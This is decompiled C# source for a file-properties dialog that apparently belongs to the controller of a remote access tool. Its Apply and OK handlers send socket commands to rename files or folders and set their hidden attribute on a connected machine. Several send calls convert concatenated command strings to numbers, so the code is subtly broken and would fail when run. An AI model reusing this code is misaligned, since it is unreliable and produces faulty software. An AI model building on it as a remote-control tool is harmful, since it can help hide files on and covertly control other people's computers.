		trr.set_Text("Type of file :");
		rtrgfgfgg.set_AutoSize(true);
		((Control)rtrgfgfgg).set_Font(new Font("Monotype Corsiva", 6.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		Label obj17 = rtrgfgfgg;
		location = new Point(8, 222);
		((Control)obj17).set_Location(location);
		((Control)rtrgfgfgg).set_Name("rtrgfgfgg");
		Label obj18 = rtrgfgfgg;
		size = new Size(323, 12);
		((Control)obj18).set_Size(size);
		((Control)rtrgfgfgg).set_TabIndex(7);
		rtrgfgfgg.set_Text("ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ");
		ujikkkk.set_AutoSize(true);
		((Control)ujikkkk).set_Font(new Font("Monotype Corsiva", 6.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		Label obj19 = ujikkkk;
		location = new Point(9, 150);
		((Control)obj19).set_Location(location);
		((Control)ujikkkk).set_Name("ujikkkk");
		Label obj20 = ujikkkk;
		size = new Size(323, 12);
		((Control)obj20).set_Size(size);
		((Control)ujikkkk).set_TabIndex(6);
		ujikkkk.set_Text("ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ");
		regrgrtttt.set_AutoSize(true);
		((Control)regrgrtttt).set_Font(new Font("Monotype Corsiva", 6.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		Label obj21 = regrgrtttt;
		location = new Point(9, 98);
		((Control)obj21).set_Location(location);
		((Control)regrgrtttt).set_Name("regrgrtttt");
		Label obj22 = regrgrtttt;
		size = new Size(323, 12);
		((Control)obj22).set_Size(size);
		((Control)regrgrtttt).set_TabIndex(5);
		regrgrtttt.set_Text("ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ");
		regrgrg.set_AutoSize(true);
		((Control)regrgrg).set_Font(new Font("Monotype Corsiva", 6.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		Label obj23 = regrgrg;
		location = new Point(9, 45);
		((Control)obj23).set_Location(location);
		((Control)regrgrg).set_Name("regrgrg");
		Label obj24 = regrgrg;
		size = new Size(323, 12);
		((Control)obj24).set_Size(size);
		((Control)regrgrg).set_TabIndex(4);
		regrgrg.set_Text("ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ");
		TabPage2.set_BackColor(SystemColors.Control);
		((Control)TabPage2).get_Controls().Add((Control)(object)FINFO);
		TabPage tabPage4 = TabPage2;
		location = new Point(4, 22);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(342, 285);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("Details");
		FINFO.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader1, ColumnHeader2 });
		((Control)FINFO).set_Dock((DockStyle)5);
		((Control)FINFO).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		FINFO.set_FullRowSelect(true);
		ListView fINFO = FINFO;
		location = new Point(3, 3);
		((Control)fINFO).set_Location(location);
		((Control)FINFO).set_Name("FINFO");
		ListView fINFO2 = FINFO;
		size = new Size(336, 279);
		((Control)fINFO2).set_Size(size);
		((Control)FINFO).set_TabIndex(4);
		FINFO.set_UseCompatibleStateImageBehavior(false);
		FINFO.set_View((View)1);
		ColumnHeader1.set_Text("Property");
		ColumnHeader1.set_Width(111);
		ColumnHeader2.set_Text("Value");
		ColumnHeader2.set_Width(134);
		((Control)OK).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button oK = OK;
		location = new Point(146, 320);
		((Control)oK).set_Location(location);
		((Control)OK).set_Name("OK");
		Button oK2 = OK;
		size = new Size(66, 22);
		((Control)oK2).set_Size(size);
		((Control)OK).set_TabIndex(1);
		((ButtonBase)OK).set_Text("OK");
		((ButtonBase)OK).set_UseVisualStyleBackColor(true);
		((Control)Apply).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button apply = Apply;
		location = new Point(280, 320);
		((Control)apply).set_Location(location);
		((Control)Apply).set_Name("Apply");
		Button apply2 = Apply;
		size = new Size(66, 22);
		((Control)apply2).set_Size(size);
		((Control)Apply).set_TabIndex(2);
		((ButtonBase)Apply).set_Text("Apply");
		((ButtonBase)Apply).set_UseVisualStyleBackColor(true);
		((Control)Cancel).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button cancel = Cancel;
		location = new Point(213, 320);
		((Control)cancel).set_Location(location);
		((Control)Cancel).set_Name("Cancel");
		Button cancel2 = Cancel;
		size = new Size(66, 22);
		((Control)cancel2).set_Size(size);
		((Control)Cancel).set_TabIndex(3);
		((ButtonBase)Cancel).set_Text("Cancel");
		((ButtonBase)Cancel).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ControlLight);
		size = new Size(353, 351);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)OK);
		((Control)this).get_Controls().Add((Control)(object)Cancel);
		((Control)this).get_Controls().Add((Control)(object)Apply);
		((Control)this).get_Controls().Add((Control)(object)TabControl1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("PFGR");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("PF");
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TabPage1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)TabPage2).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	private void PF_Load(object sender, EventArgs e)
	{
		((Control)Apply).set_Enabled(false);
	}

	public object CEK()
	{
		if (Operators.CompareString(FNS, FN.get_Text(), false) == 0)
		{
			((Control)Apply).set_Enabled(false);
			if (REN == RN.get_Checked())
			{
				((Control)Apply).set_Enabled(false);
				if (HIF == HI.get_Checked())
				{
					((Control)Apply).set_Enabled(false);
				}
				else
				{
					((Control)Apply).set_Enabled(true);
				}
			}
			else
			{
				((Control)Apply).set_Enabled(true);
			}
		}
		else
		{
			((Control)Apply).set_Enabled(true);
		}
		object result = default(object);
		return result;
	}

	public object SIN()
	{
		if (Operators.CompareString(FNS, FN.get_Text(), false) != 0)
		{
			if (!IT)
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, "Rename" + MyProject.Forms.FrmMAINGR.Key + "Folder" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(rtr.get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(FN.get_Text()));
			}
			else
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, "Rename" + MyProject.Forms.FrmMAINGR.Key + "File" + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(rtr.get_Text()) + MyProject.Forms.FrmMAINGR.Key + SocketServer.Encode(FN.get_Text()));
			}
		}
		if (REN != RN.get_Checked())
		{
			if (!IT)
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, Conversions.ToString(Conversions.ToDouble(string.Concat(string.Concat(string.Concat(string.Concat("SA" + MyProject.Forms.FrmMAINGR.Key, "Folder"), MyProject.Forms.FrmMAINGR.Key), SocketServer.Encode(rtr.get_Text())), MyProject.Forms.FrmMAINGR.Key)) + (double)(0 - (HI.get_Checked() ? 1 : 0))));
			}
			else
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, Conversions.ToString(Conversions.ToDouble(string.Concat(string.Concat(string.Concat(string.Concat("SA" + MyProject.Forms.FrmMAINGR.Key, "File"), MyProject.Forms.FrmMAINGR.Key), SocketServer.Encode(rtr.get_Text())), MyProject.Forms.FrmMAINGR.Key)) + (double)(0 - (HI.get_Checked() ? 1 : 0)) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + (double)(0 - (RN.get_Checked() ? 1 : 0))));
			}
		}
		if (HIF != HI.get_Checked())
		{
			if (!IT)
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, Conversions.ToString(Conversions.ToDouble(string.Concat(string.Concat(string.Concat(string.Concat("SA" + MyProject.Forms.FrmMAINGR.Key, "Folder"), MyProject.Forms.FrmMAINGR.Key), SocketServer.Encode(rtr.get_Text())), MyProject.Forms.FrmMAINGR.Key)) + (double)(0 - (HI.get_Checked() ? 1 : 0))));
			}
			else
			{
				MyProject.Forms.FrmMAINGR.s.Send(Sock, Conversions.ToString(Conversions.ToDouble(string.Concat(string.Concat(string.Concat(string.Concat("SA" + MyProject.Forms.FrmMAINGR.Key, "File"), MyProject.Forms.FrmMAINGR.Key), SocketServer.Encode(rtr.get_Text())), MyProject.Forms.FrmMAINGR.Key)) + (double)(0 - (HI.get_Checked() ? 1 : 0)) + Conversions.ToDouble(MyProject.Forms.FrmMAINGR.Key) + (double)(0 - (RN.get_Checked() ? 1 : 0))));
			}
		}
		HIF = HI.get_Checked();
		REN = RN.get_Checked();
		FNS = FN.get_Text();
		((Control)Apply).set_Enabled(false);
		object result = default(object);
		return result;
	}

	private void Apply_Click(object sender, EventArgs e)
	{
		SIN();
	}

	private void Cancel_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void FN_TextChanged(object sender, EventArgs e)
	{
		CEK();
	}

	private void HI_CheckedChanged(object sender, EventArgs e)
	{
		CEK();
	}

	private void OK_Click(object sender, EventArgs e)
	{
		SIN();
		((Form)this).Close();
	}

	private void RN_CheckedChanged(object sender, EventArgs e)
	{
		CEK();
	}
}
